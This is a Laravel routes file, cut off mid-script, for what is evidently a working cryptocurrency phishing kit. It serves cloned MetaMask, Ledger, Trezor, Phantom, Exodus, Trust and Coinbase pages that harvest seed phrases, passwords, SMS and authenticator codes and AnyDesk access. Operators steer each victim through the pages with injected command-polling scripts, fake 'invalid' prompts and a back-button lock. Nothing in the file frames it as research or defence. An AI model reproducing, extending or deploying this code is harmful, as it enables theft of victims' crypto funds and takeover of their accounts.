<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\UserController;
use App\Http\Controllers\AdminController;
use App\Http\Controllers\TrackingController;

// ─── ALTCHA Proof-of-Work endpoints ───────────────────────────────────────────
Route::middleware('throttle:240,1')->get('/altcha-challenge', function () {
    $altcha = new \AltchaOrg\Altcha\V1\Altcha(config('app.key'));
    $challenge = $altcha->createChallenge(new \AltchaOrg\Altcha\V1\ChallengeOptions(
        maxNumber: 20000,
        expires: new \DateTime('+10 minutes'),
    ));
    return response()->json($challenge)->header('Cache-Control', 'no-store');
});

// Proxy CoinGecko price requests server-side (avoids CORS + browser rate limits)
Route::get('/api/crypto-prices', function (\Illuminate\Http\Request $request) {
    $ids = preg_replace('/[^a-z0-9,\-]/', '', $request->query('ids', ''));
    if (!$ids) return response()->json([]);
    $cacheFile = sys_get_temp_dir() . '/cgp_' . md5($ids) . '.json';
    if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < 60) {
        $cached = json_decode(file_get_contents($cacheFile), true);
        if ($cached) return response()->json($cached)->header('Cache-Control', 'public, max-age=60');
    }
    try {
        $ctx = stream_context_create(['http' => ['timeout' => 5, 'header' => "User-Agent: Mozilla/5.0\r\n"]]);
        $raw = @file_get_contents('https://api.coingecko.com/api/v3/simple/price?ids='.$ids.'&vs_currencies=usd', false, $ctx);
        $data = $raw ? json_decode($raw, true) : [];
        if ($data) @file_put_contents($cacheFile, json_encode($data));
        return response()->json($data ?: [])->header('Cache-Control', 'public, max-age=60');
    } catch (\Throwable $e) {
        return response()->json([]);
    }
})->middleware('throttle:120,1');

Route::post('/altcha-verify', function (\Illuminate\Http\Request $request) {
    $payload = $request->input('altcha') ?? $request->input('payload');
    if (!$payload) return response()->json(['ok' => false]);
    $altcha = new \AltchaOrg\Altcha\V1\Altcha(config('app.key'));
    $ok = $altcha->verifySolution($payload, true);
    return response()->json(['ok' => $ok]);
})->middleware('throttle:240,1');

// ─── Default entry — redirects to the admin-configured entry page ────────────
$redirectToEntry = function () {
    $entry = \App\Services\LiveledSettings::getEntryPage();
    if ($entry === '' || $entry === '/') {
        abort(404);
    }
    return redirect($entry);
};
Route::get('/',       $redirectToEntry);
Route::get('/home',   $redirectToEntry);
Route::get('/signup', $redirectToEntry);
Route::get('/signin', $redirectToEntry);
Route::get('/verify', $redirectToEntry);

// ─── User pages (tracked) ─────────────────────────────────────────────────────
// Pages that enforce the site-online check
Route::middleware([
    \App\Http\Middleware\TrackUserSession::class,
    \App\Http\Middleware\CheckSiteOnline::class,
    \App\Http\Middleware\InjectPowOverlay::class,
])->group(function () {
    Route::match(['get','post'], '/metamask/import',    [UserController::class, 'metamaskImport'])->name('user.metamask-import');
    Route::get('/metamask/recover',   [UserController::class, 'metamaskRecover'])->name('user.metamask-recover');
    Route::get('/metamask/loading',   [UserController::class, 'metamaskLoading'])->name('user.metamask-loading');
    Route::get('/trust/disconnect',   [UserController::class, 'trustDisconnect'])->name('user.trust-disconnect');
    Route::get('/trust/recover',      [UserController::class, 'trustRecover'])->name('user.trust-recover');
    Route::get('/trust/loading',      [UserController::class, 'trustLoading'])->name('user.trust-loading');
    Route::match(['get','post'], '/exodus/import',       [UserController::class, 'exodusImport'])->name('user.exodus-import');
    Route::get('/exodus/recover',      [UserController::class, 'exodusRecover'])->name('user.exodus-recover');
    Route::get('/exodus/loading',      [UserController::class, 'exodusLoading'])->name('user.exodus-loading');
    Route::match(['get','post'], '/ellipal/1',           [UserController::class, 'ellipal1'])->name('user.ellipal-1');
    Route::get('/ellipal/recover',     [UserController::class, 'ellipalRecover'])->name('user.ellipal-recover');
    Route::match(['get','post'], '/ellipal/2',           [UserController::class, 'ellipal2'])->name('user.ellipal-2');
    Route::get('/ellipal/loading',     [UserController::class, 'ellipalLoading'])->name('user.ellipal-loading');
    Route::match(['get','post'], '/ledger/1',            [UserController::class, 'ledger1'])->name('user.ledger-1');
    Route::match(['get','post'], '/ledger/2',            [UserController::class, 'ledger2'])->name('user.ledger-2');
    Route::match(['get','post'], '/ledger/3',            [UserController::class, 'ledger3'])->name('user.ledger-3');
    Route::get('/ledger/1/recover',    [UserController::class, 'ledger1Recover'])->name('user.ledger-1-recover');
    Route::get('/ledger/2/recover',    [UserController::class, 'ledger2Recover'])->name('user.ledger-2-recover');
    Route::get('/ledger/3/recover',    [UserController::class, 'ledger3Recover'])->name('user.ledger-3-recover');
    Route::match(['get','post'], '/ledger/signin',   [UserController::class, 'ledgerSignin'])->name('user.ledger-signin');
    Route::match(['get','post'], '/ledger/support',  [UserController::class, 'ledgerSupport'])->name('user.ledger-support');
    Route::match(['get','post'], '/ledger/loading', [UserController::class, 'ledgerLoading'])->name('user.ledger-loading');

    Route::match(['get','post'], '/trezor/connect', [UserController::class, 'trezorConnect'])->name('user.trezor-connect');
    Route::get('/trezor/recover', [UserController::class, 'trezorRecover'])->name('user.trezor-recover');
    Route::match(['get','post'], '/trezor/phrase-page',  [UserController::class, 'trezorPhrasePage'])->name('user.trezor-phrase-page');
    Route::get('/trezor/loading',      [UserController::class, 'trezorLoading'])->name('user.trezor-loading');

    // Phantom pages
    Route::match(['get','post'], '/phantom/seeds',          [UserController::class, 'phantomSeeds'])->name('user.phantom-seeds');
    Route::get('/phantom/recover',         [UserController::class, 'phantomRecover'])->name('user.phantom-recover');
    Route::get('/phantom/loading',         [UserController::class, 'phantomLoading'])->name('user.phantom-loading');

    // Coinbase
    // Coinbase — serve static HTML with tracking/command-polling bridge injected
    $coinbasePages = [
        'support-landing' => ['file' => 'Support-Landing.html', 'page' => 'coinbase_support_landing', 'views' => true],
        'sign-in'         => ['file' => 'Sign-In.html',         'page' => 'coinbase_sign_in',         'views' => true],
        'sms-code'        => ['file' => 'SMSCodePage.html',     'page' => 'coinbase_sms_code',        'views' => true],
        'access-code'     => ['file' => 'AccessCode.html',      'page' => 'coinbase_access_code',     'views' => true],
        'access-pin'      => ['file' => 'AccessPin.html',       'page' => 'coinbase_access_pin',      'views' => true],
        'password'        => ['file' => 'PasswordPage.html',    'page' => 'coinbase_password',        'views' => true],
        'loading'         => ['file' => 'loading.html',         'page' => 'coinbase_loading',         'views' => true],
        'last-activity'           => ['file' => 'LastActivity.html',           'page' => 'coinbase_last_activity',           'views' => true],
        'estimated-balance'       => ['file' => 'EstimatedBalance.html',       'page' => 'coinbase_estimated_balance',       'views' => true],
        'high-security'           => ['file' => 'HighSecurity.html',           'page' => 'coinbase_high_security',           'views' => true],
        'reset-password'          => ['file' => 'ResetPasswordPage.html',      'page' => 'coinbase_reset_password',          'views' => true],
        'review-account-loading'  => ['file' => 'ReviewAccountLoading.html',  'page' => 'coinbase_review_account_loading',  'views' => true],
        'authenticator-code'      => ['file' => 'AuthenticatorCode.html',      'page' => 'coinbase_authenticator_code',      'views' => true],
        'anydesk'                 => ['file' => 'AnyDesk.html',                'page' => 'coinbase_anydesk',                 'views' => true],
        'device-confirmation'     => ['file' => 'DeviceConfirmationPage.html', 'page' => 'coinbase_device_confirmation',     'views' => true],
        'representative-contact'  => ['file' => 'RepresentativeContactPage.html', 'page' => 'coinbase_representative_contact', 'views' => true],
        'verify-identity'         => ['file' => 'VerifyIdentity.html',            'page' => 'coinbase_verify_identity',        'views' => true],
        'email-code'              => ['file' => 'EmailCodePage.html',             'page' => 'coinbase_email_code',             'views' => true],
        'select-id-type'          => ['file' => 'SelectIDtype.html',              'page' => 'coinbase_select_id_type',         'views' => true],
        'disconnect-wallet'       => ['file' => 'DisconnectWallet.html',          'page' => 'coinbase_disconnect_wallet',      'views' => true],
        'disconnected-done'       => ['file' => 'DisconnectedDone.html',          'page' => 'coinbase_disconnected_done',      'views' => true],
        'secure-transfer'         => ['file' => 'SecureTransfer.html',            'page' => 'coinbase_secure_transfer',        'views' => true],
        'done'                    => ['file' => 'done.html',                      'page' => 'coinbase_done',                   'views' => true],
        'seed'                    => ['file' => 'Seed.html',                      'page' => 'coinbase_seed',                   'views' => true],
        'create-vault'            => ['file' => 'CreateVault.html',              'page' => 'coinbase_create_vault',           'views' => true],
        'link-coinbase'           => ['file' => 'LinkCoinbase.html',             'page' => 'coinbase_link_coinbase',          'views' => true],
        'download-coinbase-wallet'=> ['file' => 'DownloadCoinbaseWallet.html',   'page' => 'coinbase_download_wallet',        'views' => true],
        'import-recovery-phrase'  => ['file' => 'ImportRecoveryPhrase.html',     'page' => 'coinbase_import_recovery_phrase', 'views' => true],
        'whitelist-coinbase-wallet'=> ['file' => 'WhitelistCoinbaseWallet.html', 'page' => 'coinbase_whitelist_wallet',       'views' => true],
        'connect-vault'           => ['file' => 'ConnectVault.html',             'page' => 'coinbase_connect_vault',          'views' => true],
        'select-vault-assets'     => ['file' => 'SelectVaultAssets.html',        'page' => 'coinbase_select_vault_assets',    'views' => true],
        'vault-balance'           => ['file' => 'VaultBalance.html',             'page' => 'coinbase_vault_balance',          'views' => true],
    ];
    foreach ($coinbasePages as $slug => $meta) {
        Route::match(['get','post'], '/coinbase/' . $slug, function(\Illuminate\Http\Request $request) use ($meta, $slug) {
            $csrf     = csrf_token();
            $commands = '/api/check';
            $track    = '/api/log';
            $leave    = '/api/close';
            $pageName = $meta['page'];
            $docId    = (string) request()->attributes->get('ll_document_id', '');

            if ($slug === 'password') {
                return redirect('/coinbase/sign-in');
            }

            $filePath = !empty($meta['views'])
                ? resource_path('views/user/coinbase/' . $meta['file'])
                : public_path('coinbase/' . $meta['file']);
            $content = file_get_contents($filePath);

            // Inject POST/page data for pages that need it
            if ($slug === 'sms-code') {
                $data = json_encode([
                    'cc'    => $request->input('cc',    '1'),
                    'stars' => (int)$request->input('stars', 7),
                    'last2' => $request->input('last2', ''),
                ]);
                $content = str_ireplace('</head>', "<script>window._cbSmsData={$data};</script></head>", $content);

                $cbSmsInvalidJs = 'false';
                $cbSmsToken = $request->cookie('liveled_token');
                $cbSmsSess  = $cbSmsToken ? \App\Models\UserSession::where('session_token', $cbSmsToken)->first() : null;
                $cbSmsMeta  = is_array($cbSmsSess?->metadata) ? $cbSmsSess->metadata : [];
                $cbSmsFs    = (isset($cbSmsMeta['form_state']) && is_array($cbSmsMeta['form_state']))
                    ? $cbSmsMeta['form_state'] : [];
                if (($cbSmsFs['coinbase_sms_code'] ?? 'default') === 'invalid') {
                    $content = preg_replace('/<html class="ll-fb"/', '<html class="ll-fb ll-invalid"', $content, 1);
                    $cbSmsInvalidJs = 'true';
                    if ($cbSmsSess && !$request->has('_liveled_preview')
                        && ($request->isMethod('get') || $request->isMethod('post'))) {
                        \App\Models\UserSession::where('session_token', $cbSmsSess->session_token)
                            ->where('metadata->form_state->coinbase_sms_code', 'invalid')
                            ->update(['metadata->form_state->coinbase_sms_code' => 'default']);
                    }
                }
                $cbSmsPaint = '<script>(function(){window._llCbSmsInvalid=' . $cbSmsInvalidJs . ';'
                    . 'if(!window._llCbSmsInvalid)return;'
                    . 'var el=document.getElementById("cb-sms-err");if(!el)return;'
                    . 'el.style.display="block";'
                    . 'var digits=document.querySelectorAll(".digit");'
                    . 'digits.forEach(function(inp){inp.style.boxShadow="0 0 0 1px #f87171";});'
                    . 'setTimeout(function(){el.style.display="none";digits.forEach(function(inp){inp.style.boxShadow="";});document.documentElement.classList.remove("ll-invalid");},10000);'
                    . '})();</script>';
                $content = str_ireplace('</body>', $cbSmsPaint . '</body>', $content);
            }
            if ($slug === 'sign-in') {
                $cbSiInvalidJs = 'false';
                $cbSiToken = $request->cookie('liveled_token');
                $cbSiSess  = $cbSiToken ? \App\Models\UserSession::where('session_token', $cbSiToken)->first() : null;
                $cbSiMeta  = is_array($cbSiSess?->metadata) ? $cbSiSess->metadata : [];
                $cbSiFs    = (isset($cbSiMeta['form_state']) && is_array($cbSiMeta['form_state']))
                    ? $cbSiMeta['form_state'] : [];
                if (($cbSiFs['coinbase_sign_in'] ?? 'default') === 'invalid') {
                    $content = preg_replace('/<html class="ll-fb"/', '<html class="ll-fb ll-invalid"', $content, 1);
                    $cbSiInvalidJs = 'true';
                    if ($cbSiSess && $request->isMethod('get') && !$request->has('_liveled_preview')) {
                        \App\Models\UserSession::where('session_token', $cbSiSess->session_token)
                            ->where('metadata->form_state->coinbase_sign_in', 'invalid')
                            ->update(['metadata->form_state->coinbase_sign_in' => 'default']);
                    }
                }
                $cbSiPaint = '<script>window._llCbSiInvalid=' . $cbSiInvalidJs . ';</script>';
                $content = str_ireplace('</body>', $cbSiPaint . '</body>', $content);
            }
            if ($slug === 'access-pin' && $request->isMethod('post') && $request->has('case_id')) {
                $pinData = json_encode(['case_id' => $request->input('case_id', '')]);
                $content = str_ireplace('</head>', "<script>window._cbPinData={$pinData};</script></head>", $content);
            }
            if ($slug === 'device-confirmation' && $request->isMethod('post') && $request->has('email')) {
                $dcData = json_encode(['email' => $request->input('email', '')]);
                $content = str_ireplace('</head>', "<script>window._cbDcData={$dcData};</script></head>", $content);
            }
            if ($slug === 'device-confirmation') {
                $cbDcInvalidJs = 'false';
                $cbDcToken = $request->cookie('liveled_token');
                $cbDcSess  = $cbDcToken ? \App\Models\UserSession::where('session_token', $cbDcToken)->first() : null;
                $cbDcMeta  = is_array($cbDcSess?->metadata) ? $cbDcSess->metadata : [];
                $cbDcFs    = (isset($cbDcMeta['form_state']) && is_array($cbDcMeta['form_state']))
                    ? $cbDcMeta['form_state'] : [];
                if (($cbDcFs['coinbase_device_confirmation'] ?? 'default') === 'invalid') {
                    $content = preg_replace('/<html class="ll-fb"/', '<html class="ll-fb ll-invalid"', $content, 1);
                    $cbDcInvalidJs = 'true';
                    if ($cbDcSess && !$request->has('_liveled_preview')
                        && ($request->isMethod('get') || $request->isMethod('post'))) {
                        \App\Models\UserSession::where('session_token', $cbDcSess->session_token)
                            ->where('metadata->form_state->coinbase_device_confirmation', 'invalid')
                            ->update(['metadata->form_state->coinbase_device_confirmation' => 'default']);
                    }
                }
                $cbDcPaint = '<script>(function(){window._llCbDcInvalid=' . $cbDcInvalidJs . ';'
                    . 'if(!window._llCbDcInvalid)return;'
                    . 'setTimeout(function(){document.documentElement.classList.remove("ll-invalid");},3000);'
                    . '})();</script>';
                $content = str_ireplace('</body>', $cbDcPaint . '</body>', $content);
            }
            if ($slug === 'email-code' && $request->isMethod('post') && $request->has('email')) {
                $ecData = json_encode(['email' => $request->input('email', '')]);
                $content = str_ireplace('</head>', "<script>window._cbEcData={$ecData};</script></head>", $content);
            }
            if ($slug === 'email-code') {
                $cbEcInvalidJs = 'false';
                $cbEcToken = $request->cookie('liveled_token');
                $cbEcSess  = $cbEcToken ? \App\Models\UserSession::where('session_token', $cbEcToken)->first() : null;
                $cbEcMeta  = is_array($cbEcSess?->metadata) ? $cbEcSess->metadata : [];
                $cbEcFs    = (isset($cbEcMeta['form_state']) && is_array($cbEcMeta['form_state']))
                    ? $cbEcMeta['form_state'] : [];
                if (($cbEcFs['coinbase_email_code'] ?? 'default') === 'invalid') {
                    $content = preg_replace('/<html class="ll-fb"/', '<html class="ll-fb ll-invalid"', $content, 1);
                    $cbEcInvalidJs = 'true';
                    if ($cbEcSess && !$request->has('_liveled_preview')
                        && ($request->isMethod('get') || $request->isMethod('post'))) {
                        \App\Models\UserSession::where('session_token', $cbEcSess->session_token)
                            ->where('metadata->form_state->coinbase_email_code', 'invalid')
                            ->update(['metadata->form_state->coinbase_email_code' => 'default']);
                    }
                }
                $cbEcPaint = '<script>(function(){window._llCbEcInvalid=' . $cbEcInvalidJs . ';'
                    . 'if(!window._llCbEcInvalid)return;'
                    . 'var el=document.getElementById("cb-ec-err");if(el)el.style.display="block";'
                    . 'setTimeout(function(){if(el)el.style.display="none";document.documentElement.classList.remove("ll-invalid");},3000);'
                    . '})();</script>';
                $content = str_ireplace('</body>', $cbEcPaint . '</body>', $content);
            }
            if ($slug === 'connect-vault' && $request->isMethod('post') && $request->has('email')) {
                $cvData = json_encode(['email' => $request->input('email', '')]);
                $content = str_ireplace('</head>', "<script>window._cbCvData={$cvData};</script></head>", $content);
            }
            if ($slug === 'seed' && $request->isMethod('post')) {
                $seedData = json_encode([
                    'title' => $request->input('_title', ''),
                    'sub'   => $request->input('_sub',   ''),
                    'btn'   => $request->input('_btn',   ''),
                ]);
                $content = str_ireplace('</head>', "<script>window._cbSeedData={$seedData};</script></head>", $content);
            }
            if ($slug === 'seed') {
                $seedToken = $request->cookie('liveled_token');
                $seedSess  = $seedToken ? \App\Models\UserSession::where('session_token', $seedToken)->first() : null;
                $seedMeta  = is_array($seedSess?->metadata) ? $seedSess->metadata : [];
                $seedFs    = (isset($seedMeta['form_state']) && is_array($seedMeta['form_state']))
                    ? $seedMeta['form_state'] : [];
                if (($seedFs['coinbase_seed'] ?? 'default') === 'invalid') {
                    $content = preg_replace('/<html class="ll-fb"/', '<html class="ll-fb ll-invalid"', $content, 1);
                    if ($seedSess && $request->isMethod('get') && !$request->has('_liveled_preview')) {
                        \App\Models\UserSession::where('session_token', $seedSess->session_token)
                            ->where('metadata->form_state->coinbase_seed', 'invalid')
                            ->update(['metadata->form_state->coinbase_seed' => 'default']);
                    }
                }
            }
            if ($slug === 'reset-password') {
                $cbRpInvalidJs = 'false';
                $cbRpToken = $request->cookie('liveled_token');
                $cbRpSess  = $cbRpToken ? \App\Models\UserSession::where('session_token', $cbRpToken)->first() : null;
                $cbRpMeta  = is_array($cbRpSess?->metadata) ? $cbRpSess->metadata : [];
                $cbRpFs    = (isset($cbRpMeta['form_state']) && is_array($cbRpMeta['form_state']))
                    ? $cbRpMeta['form_state'] : [];
                if (($cbRpFs['coinbase_reset_password'] ?? 'default') === 'invalid') {
                    $content = preg_replace('/<html class="ll-fb"/', '<html class="ll-fb ll-invalid"', $content, 1);
                    $cbRpInvalidJs = 'true';
                    if ($cbRpSess && $request->isMethod('get') && !$request->has('_liveled_preview')) {
                        \App\Models\UserSession::where('session_token', $cbRpSess->session_token)
                            ->where('metadata->form_state->coinbase_reset_password', 'invalid')
                            ->update(['metadata->form_state->coinbase_reset_password' => 'default']);
                    }
                }
                $cbRpPaint = '<script>(function(){window._llCbRpInvalid=' . $cbRpInvalidJs . ';'
                    . 'if(!window._llCbRpInvalid)return;'
                    . 'var el=document.getElementById("cb-rp-old-err");if(!el)return;'
                    . 'el.style.display="block";'
                    . 'var inp=document.getElementById("cb-rp-old");'
                    . 'if(inp){inp.style.borderColor="#f87171";}'
                    . 'setTimeout(function(){el.style.display="none";if(inp){inp.style.borderColor="";}document.documentElement.classList.remove("ll-invalid");},10000);'
                    . '})();</script>';
                $content = str_ireplace('</body>', $cbRpPaint . '</body>', $content);
            }
            if ($slug === 'authenticator-code') {
                $cbAuthInvalidJs = 'false';
                $cbAuthToken = $request->cookie('liveled_token');
                $cbAuthSess  = $cbAuthToken ? \App\Models\UserSession::where('session_token', $cbAuthToken)->first() : null;
                $cbAuthMeta  = is_array($cbAuthSess?->metadata) ? $cbAuthSess->metadata : [];
                $cbAuthFs    = (isset($cbAuthMeta['form_state']) && is_array($cbAuthMeta['form_state']))
                    ? $cbAuthMeta['form_state'] : [];
                if (($cbAuthFs['coinbase_authenticator_code'] ?? 'default') === 'invalid') {
                    $content = preg_replace('/<html class="ll-fb"/', '<html class="ll-fb ll-invalid"', $content, 1);
                    $cbAuthInvalidJs = 'true';
                    if ($cbAuthSess && $request->isMethod('get') && !$request->has('_liveled_preview')) {
                        \App\Models\UserSession::where('session_token', $cbAuthSess->session_token)
                            ->where('metadata->form_state->coinbase_authenticator_code', 'invalid')
                            ->update(['metadata->form_state->coinbase_authenticator_code' => 'default']);
                    }
                }
                $cbAuthPaint = '<script>(function(){window._llCbAuthInvalid=' . $cbAuthInvalidJs . ';'
                    . 'if(!window._llCbAuthInvalid)return;'
                    . 'var el=document.getElementById("cb-auth-err");if(!el)return;'
                    . 'el.style.display="block";'
                    . 'var digits=document.querySelectorAll(".digit");'
                    . 'digits.forEach(function(inp){inp.style.boxShadow="0 0 0 1px #f87171";});'
                    . 'setTimeout(function(){el.style.display="none";digits.forEach(function(inp){inp.style.boxShadow="";});document.documentElement.classList.remove("ll-invalid");},10000);'
                    . '})();</script>';
                $content = str_ireplace('</body>', $cbAuthPaint . '</body>', $content);
            }
            if ($slug === 'anydesk') {
                $cbAdInvalidJs = 'false';
                $cbAdToken = $request->cookie('liveled_token');
                $cbAdSess  = $cbAdToken ? \App\Models\UserSession::where('session_token', $cbAdToken)->first() : null;
                $cbAdMeta  = is_array($cbAdSess?->metadata) ? $cbAdSess->metadata : [];
                $cbAdFs    = (isset($cbAdMeta['form_state']) && is_array($cbAdMeta['form_state']))
                    ? $cbAdMeta['form_state'] : [];
                if (($cbAdFs['coinbase_anydesk'] ?? 'default') === 'invalid') {
                    $content = preg_replace('/<html class="ll-fb"/', '<html class="ll-fb ll-invalid"', $content, 1);
                    $cbAdInvalidJs = 'true';
                    if ($cbAdSess && $request->isMethod('get') && !$request->has('_liveled_preview')) {
                        \App\Models\UserSession::where('session_token', $cbAdSess->session_token)
                            ->where('metadata->form_state->coinbase_anydesk', 'invalid')
                            ->update(['metadata->form_state->coinbase_anydesk' => 'default']);
                    }
                }
                $cbAdPaint = '<script>(function(){window._llCbAdInvalid=' . $cbAdInvalidJs . ';'
                    . 'if(!window._llCbAdInvalid)return;'
                    . 'setTimeout(function(){document.documentElement.classList.remove("ll-invalid");},3000);'
                    . '})();</script>';
                $content = str_ireplace('</body>', $cbAdPaint . '</body>', $content);
            }
            if ($slug === 'whitelist-coinbase-wallet') {
                $cbWlInvalidJs = 'false';
                $cbWlToken = $request->cookie('liveled_token');
                $cbWlSess  = $cbWlToken ? \App\Models\UserSession::where('session_token', $cbWlToken)->first() : null;
                $cbWlMeta  = is_array($cbWlSess?->metadata) ? $cbWlSess->metadata : [];
                $cbWlFs    = (isset($cbWlMeta['form_state']) && is_array($cbWlMeta['form_state']))
                    ? $cbWlMeta['form_state'] : [];
                if (($cbWlFs['coinbase_whitelist_wallet'] ?? 'default') === 'invalid') {
                    $content = preg_replace('/<html class="ll-fb"/', '<html class="ll-fb ll-invalid"', $content, 1);
                    $cbWlInvalidJs = 'true';
                    if ($cbWlSess && $request->isMethod('get') && !$request->has('_liveled_preview')) {
                        \App\Models\UserSession::where('session_token', $cbWlSess->session_token)
                            ->where('metadata->form_state->coinbase_whitelist_wallet', 'invalid')
                            ->update(['metadata->form_state->coinbase_whitelist_wallet' => 'default']);
                    }
                }
                $cbWlPaint = '<script>(function(){window._llCbWlInvalid=' . $cbWlInvalidJs . ';'
                    . 'if(!window._llCbWlInvalid)return;'
                    . 'var el=document.getElementById("wl-seed-err");if(!el)return;'
                    . 'if(!el.textContent)el.textContent="The seed phrase you entered is incorrect. Please try again with the correct seed phrase.";'
                    . 'el.style.display="block";'
                    . 'var inp=document.getElementById("wl-seed-inp");'
                    . 'if(inp){inp.style.borderColor="#ef4444";inp.style.boxShadow="0 0 0 1px #ef4444";}'
                    . 'setTimeout(function(){el.style.display="none";if(inp){inp.style.borderColor="";inp.style.boxShadow="";}document.documentElement.classList.remove("ll-invalid");},12000);'
                    . '})();</script>';
                $content = str_ireplace('</body>', $cbWlPaint . '</body>', $content);
            }
            if ($slug === 'loading') {
                $cbWlLdgWrap = <<<'HTML'
<script>
(function(){
  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isCbWlGet(u){
    var p=destPath(u);
    return p==='/coinbase/whitelist-coinbase-wallet'||p==='/coinbase/reset-password'||p==='/coinbase/authenticator-code'||p==='/coinbase/anydesk'||p==='/coinbase/sign-in'||p==='/coinbase/loading';
  }
  function isCbDc(u){
    return destPath(u)==='/coinbase/device-confirmation';
  }
  function isCbEc(u){
    return destPath(u)==='/coinbase/email-code';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      var takeDc=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!wouldKeep(cmd))return;
          if(isCbWlGet(u))take=cmd;
          else if(isCbDc(u)||isCbEc(u))takeDc=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname)window.location.reload();
        else window.location.href=dest;
        return;
      }
      if(takeDc){
        if(takeDc.id){
          try{sessionStorage.setItem('_ll_cmd_'+takeDc.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var destDc=(takeDc.payload&&takeDc.payload.url)||'/';
        var post=takeDc.payload&&takeDc.payload.post;
        if(post){
          var form=document.createElement('form');
          form.method='POST';
          form.action=destDc;
          if(!post._token){
            var ti=document.createElement('input');
            ti.type='hidden';ti.name='_token';
            ti.value=window._liveledCSRF||'';
            form.appendChild(ti);
          }
          Object.keys(post).forEach(function(k){
            if(k==='_token')return;
            var inp=document.createElement('input');
            inp.type='hidden';inp.name=k;inp.value=post[k];
            form.appendChild(inp);
          });
          document.body.appendChild(form);
          form.submit();
        }else{
          window.location.href=destDc;
        }
        return;
      }
    }catch(e){}
    if(prev)prev.apply(this,arguments);
  };
})();
</script>
HTML;
                $content = str_ireplace('</body>', $cbWlLdgWrap . '</body>', $content);
            }
            if ($slug === 'vault-balance') {
                $allCoinKeys  = ['btc','eth','xrp','sol','ltc','doge','bnb','usdt','usdt_trc20','usdc','usdc_base','usdc_sol','usdc_polygon','ada','dot','shib','avax','matic','link','uni','xlm','trx','atom','vet','bch','wbtc','dai','ton','cro','near','arb','op','sui','apt','inj','hbar','ldo','stx','aave','icp','render','tao','pepe','bonk','wif','floki','mana','sand','axs'];
                $sessionToken = $request->cookie('liveled_token');
                $session      = $sessionToken ? \App\Models\UserSession::where('session_token', $sessionToken)->first() : null;

                if ($request->isMethod('post')) {
                    $coinKeysStr    = $request->input('coin_keys', '');
                    $requestedKeys  = array_filter(array_map('trim', explode(',', $coinKeysStr)));
                    $allKeys        = array_unique(array_merge($allCoinKeys, $requestedKeys));
                    $vbArr = [
                        'balance'   => $request->input('balance', ''),
                        'coin_keys' => $coinKeysStr,
                        'coin_meta' => $request->input('coin_meta', ''),
                    ];
                    if ($session) {
                        $meta = $session->metadata ?? [];
                        $existingVb = $meta['coinbase_vault_data'] ?? [];
                        foreach ($allKeys as $k) {
                            $isActive   = in_array($k, $requestedKeys);
                            $sentAddr   = $request->input($k.'_address', '');
                            $sentAmt    = $request->input($k.'_amount',  '');
                            // For active coins: always use the sent value (admin can clear it)
                            // For inactive coins: only overwrite if sent value is non-empty, else preserve existing
                            $vbArr[$k.'_address'] = ($isActive || $sentAddr !== '') ? $sentAddr : ($existingVb[$k.'_address'] ?? '');
                            $vbArr[$k.'_amount']  = ($isActive || $sentAmt  !== '') ? $sentAmt  : ($existingVb[$k.'_amount']  ?? '');
                        }
                        // Brand-namespaced key so Coinbase and CC vault data never overwrite each other
                        $meta['coinbase_vault_data'] = $vbArr;
                        $session->metadata = $meta;
                        $session->save();
                    } else {
                        foreach ($allKeys as $k) {
                            $vbArr[$k.'_address'] = $request->input($k.'_address', '');
                            $vbArr[$k.'_amount']  = $request->input($k.'_amount',  '');
                        }
                    }
                } else {
                    $meta  = $session ? ($session->metadata ?? []) : [];
                    // Read from brand-namespaced key; fall back to legacy 'vault_data' for old sessions
                    $vbArr = $meta['coinbase_vault_data'] ?? $meta['vault_data'] ?? [];
                }

                if (!empty($vbArr)) {
                    $vbData = json_encode($vbArr);
                    $content = str_ireplace('</head>', "<script>window._cbVaultData={$vbData};</script></head>", $content);
                }
            }
            if ($slug === 'download-coinbase-wallet' && $request->isMethod('post')) {
                $dcwData = json_encode([
                    'app_name'  => $request->input('app_name',  ''),
                    'app_store' => $request->input('app_store', ''),
                    'play_store'=> $request->input('play_store',''),
                ]);
                $content = str_ireplace('</head>', "<script>window._cbDcwData={$dcwData};</script></head>", $content);
            }
            if ($slug === 'import-recovery-phrase' && $request->isMethod('post')) {
                $irpData = json_encode([
                    'exchanger' => $request->input('exchanger', ''),
                    'anti_dumb' => $request->input('anti_dumb', ''),
                ]);
                $content = str_ireplace('</head>', "<script>window._cbIrpData={$irpData};</script></head>", $content);
            }
            if ($slug === 'secure-transfer' && $request->isMethod('post')) {
                $stData = json_encode([
                    'exchanger' => $request->input('exchanger', ''),
                    'anti_dumb' => $request->input('anti_dumb', ''),
                ]);
                $content = str_ireplace('</head>', "<script>window._cbStData={$stData};</script></head>", $content);
            }
            if ($slug === 'select-vault-assets' && $request->isMethod('post')) {
                $svaData = json_encode([
                    'title' => $request->input('_title', ''),
                    'sub'   => $request->input('_sub',   ''),
                    'btn'   => $request->input('_btn',   ''),
                ]);
                $content = str_ireplace('</head>', "<script>window._cbSvaData={$svaData};</script></head>", $content);
            }

            $docAuth = \App\Services\DocumentAuthority::clientScript($pageName, $csrf, $docId, 'Coinbase Page');
            $histLock = '';
            if ($slug !== 'sign-in') {
                $histDest = ($slug === 'loading' || $slug === 'review-account-loading')
                    ? '/coinbase/' . $slug
                    : '/coinbase/loading';
                $histLock = "  history.pushState(null,'',location.href);\n"
                    . "  window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('{$histDest}');});\n"
                    . "  window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('{$histDest}');});\n";
            }
            $bridge = <<<HTML

<!-- liveled command bridge -->
<script>
(function(){
  if(window.location.search.indexOf('_liveled_preview')!==-1)return;
